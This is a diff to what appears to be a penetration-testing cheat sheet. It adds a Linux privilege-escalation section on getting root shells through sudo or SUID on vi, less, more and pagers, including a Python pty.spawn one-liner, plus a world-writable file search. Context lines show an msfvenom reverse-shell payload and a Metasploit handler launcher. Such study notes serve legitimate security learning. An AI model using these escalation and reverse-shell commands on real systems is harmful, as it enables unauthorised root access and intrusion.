@@ -870,7 +870,18 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.134 LPORT=443 EXITFUNC=threa
 You can use `i686-w64-mingw32-gcc` to compile a window execuiteable on a linux machine.  You
 can then use `wine` to execute it.
 
+## Privesc on Linux
 
+### Non-Restrictive Sudo and Set UID bit
+Lots of programs can allow you to get a shell if you can run it as root either by being
+allowed via sudo or if the SUID bit is set for it.
+
+* vi and vim - In the program hiting ESC then `:sh` will bring up a shell
+* less - Run less on a file then tyep `! /bin/bash` to get a shell
+* more - Same as less
+* Python and other scrypting engines - create your own shell.
+   * Python - sudo python -c 'import pty;pty.spawn("/bin/bash")'
+* Anything that uses less or more as a pager - (systemctl status, man, etc
 
 ### Usefull Windows commands
 
@@ -995,7 +1006,7 @@ Copy a file to your clipboard
 cat file.txt | xclip -selection c
 ```
 
-quick launch Metasploit handler
+Quickly launch Metasploit handler
 ```bash
 service postgresql start
 msfconsole -q -x "use exploit/multi/handler; set payload <PAYLOAD USED>; set lhost <LOCAL IP>; set lport <LOCAL PORT>; run"
@@ -1016,4 +1027,9 @@ cat nmap-scan.gnmap | grep -Eo "([0-9]+)/open" | grep -Eo "[0-9]+"
 or
 ```bash
 cat nmap-scan.gnmap | grep -Eo "([0-9]+)/open" | cut -d "/" -f 1
+```
+
+Find all files with world writeable permissions and ignore links.
+```bash
+find . -perm -002 ! -type l -exec ls -l {} \;
 ```
